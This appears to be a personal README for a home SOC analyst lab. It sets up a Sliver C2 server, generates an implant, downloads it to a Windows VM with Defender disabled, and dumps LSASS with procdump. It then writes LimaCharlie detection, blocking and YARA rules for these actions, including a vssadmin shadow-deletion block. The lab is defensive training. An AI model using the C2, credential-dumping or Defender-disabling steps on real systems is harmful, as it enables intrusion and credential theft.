# SOC Analyst EDR Lab

## Objective

The Detection Lab project aimed to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze the use of an EDR, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen understanding of network security, attack patterns, and defensive strategies. 

### Skills Learned
<!--- [Bullet Points - Remove this afterwards] --->

- Detection of remote connections and creating alerts for detection.
- Proficiency in analyzing and interpreting system irregularities.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.
- Blocking an attack.
- Tuning detections to block out false positives.

### Tools Used
<!--- [Bullet Points - Remove this afterwards] --->

- EDR system (LimaCharlie) for detection and analysis of the endpoint.
- System analysis tools like sysmon to track irregularities on endpoints.
- Telemetry generation tools to create realistic network traffic and attack scenarios.

## Setup

This is a lab from a blog post. You can follow along with it [here](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro). The steps in this are just a summarization of the parts.

###Part 1 - Setup a small vitrualization environment (2 small VMs)

1. Download and install VMware Workstation Pro.
2. Download and deploy a free Windows VM directly from Microsoft.
3. Download and install Ubuntu into a new VM and make sure to set a static IP on the same subnet as the Microsoft OS.
4. Set a memorable username/password (this is just a lab).
5. Install OpenSSH server on Ubuntu.
6. Continue on the Ubuntu Server install till complete. 
7. Restart Ubuntu.
8. Ping google.
``` ping -c 2 google.com ```
9. Make sure you get a similar output to below.
![image](https://github.com/user-attachments/assets/5a7b2374-4f5d-401a-bc60-a310cb825c03)
10. Next is turning on the Windows VM and disabling Defender on it.
11. Removing Tamper Protection is our first step and there are other options on the same area as them that should also be turned off. The following steps ensure that it does not turn itself back on. Setting the registry options to 4 in this part disables that tool and it will disable the main parts of Defender to stop it from starting up upon any further boots.
12. From an administrative command prompt, to prevent the VM from going into sleep/standby mode during our shenanigans.
```
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
```
These commands just change power configuration to never get triggered for a system event to turn off the computer.
13. Install Sysmon for getting granular telemetry on the Windows endpoint.
14. Install LimaCharlie and make a sensor for your endpoint on the site then install that sensor to point out to the EDR so events will be recorded.
15. After we are done with the Windows machine then move to Ubuntu to setup the attack machine. SSH from a command prompt on your computer so you can copy and paste the commands easier or just type them into your VM.
16. Now to install Sliver Linux server on the attacking machine.
```
# Download Sliver Linux server binary
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux -O /usr/local/bin/sliver-server
# Make it executable
chmod +x /usr/local/bin/sliver-server
# install mingw-w64 for additional capabilities
apt install -y mingw-w64
```
17. Then make a directory to store information for later.
```
# Create our future working directory
mkdir -p /opt/sliver
```

### Part 2 - Generate our C2 payload
1. Get into root and change directory to opt/sliver/ to run sliver server for this part the lauch Sliver server
2. Generating a C2 session use the following command
   ``` generate --http [Linux_VM_IP] --save /opt/sliver ```
3. Once you've gotten it created it should show "Implate saved to [file path]/[filename].exe"
4. You can check to be sure by running the command
   ``` implants ```
![image](https://github.com/user-attachments/assets/256e52ff-5296-4e85-9f78-54cc0f5f753e)
5. In order to download the C2 you'll need to start a python temp web server with
   ``` python3 -m http.server 80 ```
6. Now you can pull the file with a admin powershell using command
   ``` IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe ```
7. Now that will pull it to your victim and make the file usable
8. In order to start up your connection will need to start up sliver server and then run http listener. Then on the victim machine you'll need to run the file with a admin cmd.
   ``` C:\Users\User\Downloads\[c2_implant].exe ```
9. Once that is running you can go back to the Ubuntu ssh. Run the command
    ``` http ```
   ![image](https://github.com/user-attachments/assets/c911a3a4-dfdc-4eb0-9c42-37a6eb17fc1f)
10. Then you can confirm your session to be able to get a remote connection by listing using
    ```sessions``` then use the session ID and then the command ```use [session ID number]```
11. Now you can get infromation about your session with ```info``` you can use this to run commands in the background as long as the connection is working as it should. You can see what things you can do with the ```getprivs``` command
![image](https://github.com/user-attachments/assets/b840c60f-5ad0-424e-995d-b62c6b7ba95a)
![image](https://github.com/user-attachments/assets/68c21d40-51d3-4261-9e9d-6143c4f578ac)
12. Now we can see connections on the pc if we use netstat and the green one will be your sliver connection
  ![image](https://github.com/user-attachments/assets/ea128754-5738-4e5d-bd10-762cfda304db)
13. Running ps -T will show you the running processes and the red hightlighted ones are a defensive measure while the green hightlight one is the sliver process

![image](https://github.com/user-attachments/assets/eb0c4d2e-db82-4f75-96ae-1ab1dc816d0b)
![image](https://github.com/user-attachments/assets/0cc86ee2-8836-49a2-b202-84fe532107c6)

15. Since we're using and EDR we want to be familiar with the processes that run, but this is my first lab and noticing after the installation of the EDR (LimaCharlie) we can identitfy network connections that are active. Through LimaCharlie go to your sensors and click the processes under the lab sensor that is installed. You can search by process name or just scroll through and see active connections with a wave next to the process.
![image](https://github.com/user-attachments/assets/67ec523c-464b-45cb-b2f3-766c26d4c65f)

16. If you click the veritcal dots and go to view network connection you'll find where the connection leads to.
![image](https://github.com/user-attachments/assets/65b873b5-c32d-45bf-8cbe-a87ecce4cc13)

17. Explore other parts of the LimaCharlie interface to find network connections and the file system.
18. You can find the hash of the file and even search in virus total to see if its known.
![image](https://github.com/user-attachments/assets/ff058b34-3483-4756-95c3-4590af8ace7f)
This file is unique since we created it and because of that its never been seen before but since we're analysts we need to trust ourselves that if something seems suspicious it should be investigated further if something doesn't seem right.
19. Inspecting timeline can show us signed processes and unsigned which might be of importance to us seeing as we're suspecting some malicious activity, but could be useful in real world scenarios to identify malicious activity.

### Part 3 - Let's Get Adversarial
1. Now that we've explored new avenues that we've created and how to detect the malicious activity we want to see about doing something all attackers want and thats get CREDENTIALS. Run the command ``` procdump -n lsass.exe -s lsass.dmp ```
2. In another lab I'll look into processing this lsass dump but for now its just an excercise to see how to get it from sliver server.

3. Now we are going back to LimaCharlie to find a SENSITIVE_PROCESS_ACCESS event that will alert us of something that is likely to be out of the ordinary.
![image](https://github.com/user-attachments/assets/b697416b-2eb9-489e-a746-c7ca22388f7c)

4. Now that we found this type of activity and understand it to be malicious we need to detect anytime this happens and setup a D&R rule. Use the following button to make a D&R rule.
![image](https://github.com/user-attachments/assets/d425bb70-22d9-402a-b8a6-1bdda41e8e1d)
5. When making the rule for this lab we can use.
```
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe
```
The lab is not for a real world scenario because the lab admits that this rule would be noisy and not very useful without some tuning.
6. Then we tell it what to name it with in the following in the response box.
```
- action: report
  name: LSASS access
```
7. Once you've created this run the rule against the event at the bottom of the page to determine if it will work. Then save it with a name that will help with showing detections easier in the detection section.
8. Run procdump again and check detections for a new event.

### Part 4 - Blocking Attacks
1. Now we're going to do some things that will cause suspicious activity again and something an attacker would do to remove good backups in order to keep their software on the system. We will remove volume shadow copies.
2. In sliver server; get a session going again if you've stopped it.
3. Run the command ``` shell ``` from your sliver server in the local command prompt
   ![image](https://github.com/user-attachments/assets/ccdb9eae-e6b8-4efa-a662-586f10ee12c9)
4. There probably won't be any shadow copies but just running this command can show malicious activity and give us a baseline to work with in order to keep false positives to a minimum. If we start blocking just anything it could cause some chaos in a real environment so getting this right is crucial.
5. Go to detections in LimaCharlie and you'll notice the vssadmin for shadow deletion was detected. You can click on the small button on the top right that looks like an arrow pointing up and to the right to make a D&R rule.
6. Create the D&R with the following
   Detect:
```
event: NEW_PROCESS
op: and
rules:
-  op: is
path: event/FILE_PATH
value: C:\Windows\system32\vssadmin.exe
- op: is
path: event/COMMAND_LINE
value: '"C:\Windows\system32\vssadmin.exe" delete shadows /all'
- op: is
path: routing/hostname
value: windev2407eval.localdomain
```
7. Then create the response with this:
```
name: vss_deletion_kill_it
- action: task
command:
- deny_tree
- <<routing/parent>>
```
8. Now if you run the same command from your shell session it will be stopped by the EDR. Go ahead and test it out.

### Part 5 - Tuning Your Detection
1. Just as an exaple for the rules when they give us false positives svchost is something the author uses as an example. Where if the expected path for the svchost.exe was to run from system32 then that should be marked as false positive on LimaCharlie. When you look at the detection event made by the rule for svchost if it was written badly it would give you that false positive.
2. On the false positive detection you need to click "Mark False Positive" to create a False Positive Rule so that you can stop the unneccessary alerts and streamline your detections. Some of the already written rules are good, but one that is pointed out is that the hash would be seen as false but that wouldn't be a good thing to use because svchost could updated so the hash would be good to remove since the hash will change with updates.
3. Also, we want to have the hostname be for all hosts not just a specific one so remove that line about hosts.
4. Now you should go back and find other events of svchost detections and copy its information to test it against your false positive rule.

### Part 6 - Trigger YARA scans with a detection rule
1. We're going to make a YARA rule within LimaCharlie to sift through information to find malware signatures.
![image](https://github.com/user-attachments/assets/49c63efe-7f49-4823-9f91-1f3ae7f64f48)
2. Then click "Add Yara Rule"
   
![image](https://github.com/user-attachments/assets/7f3c06c2-07cb-4c94-a56f-cbfc7f8bf246)

4. Copy and past the content of [gist](https://gist.githubusercontent.com/ecapuano/2c59ff1ea354f1aae905d6e12dc8e25b/raw/831d7b7b6c748f05123c6ac1a5144490985a7fe6/sliver.yara) to detect the command inputs from sliver
5. Once saved we're making another to detect the process of sliver copy [gist](https://gist.githubusercontent.com/ecapuano/f40d5a99d19500538984bd88996cfe68/raw/12587427383def9586580647de13b4a89b9d4130/sliver_broad.yara) and add this to a new YARA rule.
6. Then we will have to make some D&R rules with the following in Detect:
```
event: YARA_DETECTION
op: and
rules:
  - op: exists
    path: event/RULE_NAME
  - op: exists
    path: event/PROCESS/*
```
This detection is looking for YARA rules specifically.
Now, we need to add a reponse to the rule. Add the following to the respond block
```
- action: report
  name: YARA Detection in Memory {{ .event.RULE_NAME }}
- action: add tag
  tag: yara_detection_memory
  ttl: 80000
```
6. Now, we need to make sure the rules work and tell us what we want to know.
7. Click on Sensors List and choose the Windows VM

![image](https://github.com/user-attachments/assets/fb731c98-3942-470e-8861-84ef9a253522)

![image](https://github.com/user-attachments/assets/c545dfb4-c521-49cd-8274-2d134e86f91e)

8.Run the command to kick off a manual YARA scan. Use the payload we created in the 2nd part of this lab.
``` yara_scan hive://yara/sliver -f C:\Users\User\Downloads\[payload_name].exe ```

![image](https://github.com/user-attachments/assets/82335f0e-6236-4967-a40d-d74524958601)

Hit enter twice to execute the command.

![image](https://github.com/user-attachments/assets/2f2e43a3-db00-40c8-914f-1869ae400328)

After the execution we need to make sure we have a new detection in the "Detections" area.

![image](https://github.com/user-attachments/assets/2e295895-fa2f-4931-bee8-825cbd35d922)

9. Since that is there we're going to create a new rule in the Automation > D&R Rules when you start the new rule add this to the Detect block:
```
event: NEW_DOCUMENT
op: and
rules:
  - op: starts with
    path: event/FILE_PATH
    value: C:\Users\
  - op: contains
    path: event/FILE_PATH
    value: \Downloads\
  - op: ends with
    path: event/FILE_PATH
    value: .exe
```
This detection will look for any new .exe files in the downloads.
Then in the Response block add this:
```
- action: report
  name: EXE dropped in Downloads directory
- action: task
  command: >-
    yara_scan hive://yara/sliver -f "{{ .event.FILE_PATH
    }}"
  investigation: Yara Scan Exe
  suppression:
    is_global: false
    keys:
      - '{{ .event.FILE_PATH }}'
      - Yara Scan Exe
    max_count: 1
    period: 1m
```
This response action generates an alert for the EXE creation, but more importantly, kicks off a YARA scan using the Sliver signature against the newly created EXE.
10. We will need to make a new detection that will scan for procceses launched from downloads directory.
11. Go to Automation > D&R Rules then create a new rule and in the Detect block put this:
```
event: NEW_PROCESS
op: and
rules:
  - op: starts with
    path: event/FILE_PATH
    value: C:\Users\
  - op: contains
    path: event/FILE_PATH
    value: \Downloads\
```
This rule will alert if anything with .exe is launched from the downloads directory.
12. In the Response block put this:
```
- action: report
  name: Execution from Downloads directory
- action: task
  command: yara_scan hive://yara/sliver-process --pid "{{ .event.PROCESS_ID }}"
  investigation: Yara Scan Process
  suppression:
    is_global: false
    keys:
      - '{{ .event.PROCESS_ID }}'
      - Yara Scan Process
    max_count: 1
    period: 1m
```
13. Triggering the new rules by scanning new exes in downloads. The way to simulate this will be to move the file out of Downloads then back into it to trigger the event. And to accomplish this run an admin powershell then move the file with:
``` Move-Item -Path C:\Users\User\Downloads\[payload_name].exe -Destination C:\Users\User\Documents\[payload_name].exe ```
Replace payload with your C2 file name.
14. Move it back in to trigger our event for the exe being added to the downloads folder with:
``` Move-Item -Path C:\Users\User\Documents\[payload_name].exe -Destination C:\Users\User\Downloads\[payload_name].exe ```
Then we can head over to detections and see what happened!
15. We can see that the detections worked and that there is a record to alert us!
![image](https://github.com/user-attachments/assets/b2cc6056-398e-475c-8763-56c077767aee)
16. The last thing to check is to make sure the process will be recognized so that if it launches we'll know.
17. Next, you'll need to use an Admin PowerShell to run the process so we can see the New_Process detection works. From an Admin PowerShell run 
```
C:\Users\User\Downloads\[payload_name].exe
```
*Ref 1: Network Diagram*
